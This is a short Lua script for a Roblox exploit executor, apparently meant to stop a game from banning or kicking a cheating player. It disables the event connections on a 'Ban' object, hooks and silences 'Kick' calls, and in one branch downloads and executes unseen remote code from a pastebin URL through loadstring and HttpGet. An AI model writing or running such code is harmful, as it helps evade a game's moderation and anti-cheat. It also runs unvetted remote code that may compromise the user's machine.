if getconnections then
  if game.ReplicatedStorage.Interaction:FindFirstChild("Ban") then
    for i, v in pairs(getconnections(game.ReplicatedStorage.Interaction:FindFirstChild("Ban").AncestryChanged)) do
      v:Disable()
    end
  end
else
  if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))() end
  game:AddGlobalCallHook("Kick", function(t,...)
  end)
end
